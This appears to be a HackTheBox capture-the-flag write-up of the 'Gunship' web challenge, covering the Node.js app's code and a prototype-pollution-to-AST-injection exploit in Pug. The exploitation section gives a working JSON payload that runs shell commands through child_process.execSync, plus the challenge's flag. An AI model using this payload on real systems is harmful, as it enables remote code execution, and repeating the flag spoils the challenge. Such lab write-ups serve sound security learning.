---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [AST-Injection, __proto__, pollution, __proto__., nodejs, pug]
---
>[!quote]
> *A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world... all the wooing in the world to make you feel more lonely... this ride ends here, with a tribute page of the British synthwave band called Gunship. 🎶*


# Set up

Build docker image

```bash
$ ./build-docker.sh 
Sending build context to Docker daemon  432.1kB
Step 1/11 : FROM node:12.13.0-alpine
12.13.0-alpine: Pulling from library/node
Digest: sha256:ae1822c17b0087cb1eea794e5a293d56cc1fe01f01ef5494d0687c1ef9584239
Status: Downloaded newer image for node:12.13.0-alpine
 ---> 69c8cc9212ec
Step 2/11 : RUN apk --no-cache add supervisor
 ---> Using cache
 ---> e1145aeda84e
Step 3/11 : RUN mkdir -p /app
 ---> Using cache
 ---> c33ffaa6ca58
Step 4/11 : WORKDIR /app
 ---> Using cache
 ---> 6ae24b59d1d6
Step 5/11 : COPY --chown=nobody challenge .
 ---> Using cache
 ---> ed9831f0c5b5
Step 6/11 : COPY config/supervisord.conf /etc/supervisord.conf
 ---> Using cache
 ---> 1dbf40091fd0
Step 7/11 : RUN yarn
 ---> Using cache
 ---> 41f379dd7e9d
Step 8/11 : EXPOSE 1337
 ---> Using cache
 ---> 9bc50ec09783
Step 9/11 : COPY entrypoint.sh /entrypoint.sh
 ---> Using cache
 ---> 4234fcda3baa
Step 10/11 : ENTRYPOINT [ "/entrypoint.sh" ]
 ---> Using cache
 ---> 1ad11a2315b7
Step 11/11 : CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
 ---> Using cache
 ---> d217a8ac38ac
Successfully built d217a8ac38ac
Successfully tagged web_gunship:latest
2022-04-06 08:06:22,567 CRIT Supervisor is running as root.  Privileges were not dropped because no user is specified in the config file.  If you intend to run as root, you can set user=root in the config file to avoid this message.
2022-04-06 08:06:22,569 INFO supervisord started with pid 1
2022-04-06 08:06:23,574 INFO spawned: 'node' with pid 14
Listening on port 1337
2022-04-06 08:06:24,936 INFO success: node entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

Run the server instance when ready

# Information Gathering

## Layout

Home page layout and structure:

![Home page](../../zzz_res/attachments/Gunship%20d7aa8f7841234d1c993ba55c44ab5191.png)

Home page

![Send form](../../zzz_res/attachments/Gunship%20d7aa8f7841234d1c993ba55c44ab5191%201.png)

Send form

## HTTP requests

Request sent to the server

```
POST /api/submit HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 41
Connection: close

{"artist.name":"Haigh"}
```

Server response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 71
ETag: W/"47-rwAspkHcQlGCzm/YzRg9211inOE"
Date: Wed, 06 Apr 2022 08:24:41 GMT
Connection: close

{"response":"<span>Hello guest, thank you for letting us know!</span>"}
```

## Code

- **index.html**
    
    ```html
    <html>
    <head>
       <title>Gunship</title>
       <meta name='viewport' content='width=device-width, initial-scale=1'>
       <meta name='author' content='makelaris'>
       <link rel='icon' href='/static/images/favicon.png' type='image/png' />
       <link rel='stylesheet' href='/static/css/main.css' />
    </head>
    <body>
       <div id='main'>
       <h1 id='title'>GUNSHIP</h1>
       <div>
          Retro futuristic assault, a neon soaked, late night, sonic getaway drive.
       </div>
       <div id='img-div'>
          <img id='image' src='https://media.giphy.com/media/k81NasbqkKA5HSyJxN/source.gif'></img>
          <div id='img-caption'>
             <br>Gunship is a British synthwave band formed in 2010 by Dan Haigh and Alex Westaway.
          </div>
       </div>
       <div id='tribute-info'>
          <ul>
             <h3 id='headline'>Gunship Timeline</h3>
             <li>Alex Westaway and Dan Haigh's other musical act, Fightstar goes on hiatus 2010</li>
             <li>Gunship is formed 2010</li>
             <li>Debut release, self titled <i>Gunship</i> released 2015</li>
             <li>Collaborated with Metrik on the track <i>Electric Echo</i> 2016</li>
             <li>Collaborated with Lazerhawk on the track <i>Feel The Rush</i> 2017</li>
             <li>Remixed Lionface's <i>No Hope State</i> 2017</li>
             <li>Included the track <i>Vale Of Shadows</i> on <i>Rise of the Synths EP 2</i> 2017</li>
             <li>Single <i>Art3mis & Parzival</i> released 2018</li>
             <li>Follow up release <i>Dark All Day</i> released 2018</li>
          </ul>
       </div>
       <p>FIND OUT MORE ABOUT GUNSHIP <a id='tribute-link' href='https://www.retro-synthwave.com/artists/gunship' target='_blank'>HERE<a>.</p>
       <div id='main'>
       <h1 id='title'>Who's your favourite artist?</h1>
       <div>
       <form id='form' action='/' method='POST'>
          <div class='input-field'>
             <input type='text' name='name' placeholder='name' autocomplete='off' required />
             <button type='submit' form='form'>Send</button>
          </div>
       </form>
       <p id='output'></p>
       <script src='/static/js/main.js' type='text/javascript'></script>
    </body>
    </html>
    ```
    
- **main.js**
    
    ```jsx
    document.getElementById('form').addEventListener('submit', e => {
    	e.preventDefault();
    
    	fetch('/api/submit', {
    		method: 'POST',
    		body: JSON.stringify({
    			'artist.name': document.querySelector('input[type=text]').value
    		}),
    		headers: {'Content-Type': 'application/json'}
    	}).then(resp => {
    		return resp.json();
    	}).then(data => {
    		document.getElementById('output').innerHTML = data.response;
    	});
    
    });s
    ```
    
- **index.js**
    
    ```jsx
    const path              = require('path');
    const express           = require('express');
    const pug        		= require('pug');
    const { unflatten }     = require('flat');
    const router            = express.Router();
    
    router.get('/', (req, res) => {
        return res.sendFile(path.resolve('views/index.html'));
    });
    
    router.post('/api/submit', (req, res) => {
        const { artist } = unflatten(req.body);
    
    	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
    		return res.json({
    			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
    		});
    	} else {
    		return res.json({
    			'response': 'Please provide us with the full name of an existing member.'
    		});
    	}
    });
    
    module.exports = router;
    ```
    

# The Bug

- package.json
    
    ```jsx
    {
    	"name": "gunship",
    	"version": "1.0.0",
    	"description": "",
    	"main": "index.js",
    	"scripts": {
    		"start": "node index.js",
    		"dev": "nodemon .",
    		"test": "echo \"Error: no test specified\" && exit 1"
    	},
    	"keywords": [],
    	"authors": [
    		"makelaris",
    		"makelarisjr"
    	],
    	"dependencies": {
    		"express": "^4.17.1",
    		"flat": "5.0.0",
    		"pug": "^3.0.0"
    	}
    }
    ```
    

[AST Injection, Prototype Pollution to RCE](https://blog.p6.is/AST-Injection/#Pug)

[NodeJS - __proto__ & prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

# Exploitation

## Prototype Pollution to RCE

Request:

```
POST /api/submit HTTP/1.1
Host: 134.209.28.38:30545
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 185
Connection: close

{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('mkdir $(cat flagtZ1pK)')"
    },
"artist.name":"Haigh"
}
```

Server response:

```
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1160
Date: Wed, 06 Apr 2022 09:56:09 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Command failed: mkdir $(cat flagtZ1pK)<br>mkdir: can&#39;t create directory &#39;HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}&#39;: Permission denied<br> on line 1<br> &nbsp; &nbsp;at checkExecSyncError (child_process.js:621:11)<br> &nbsp; &nbsp;at Object.execSync (child_process.js:657:15)<br> &nbsp; &nbsp;at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:13:63)<br> &nbsp; &nbsp;at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:17:7)<br> &nbsp; &nbsp;at /app/routes/index.js:16:81<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:281:22</pre>
</body>
</html>
```

# Flag

>[!success]
>`HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}`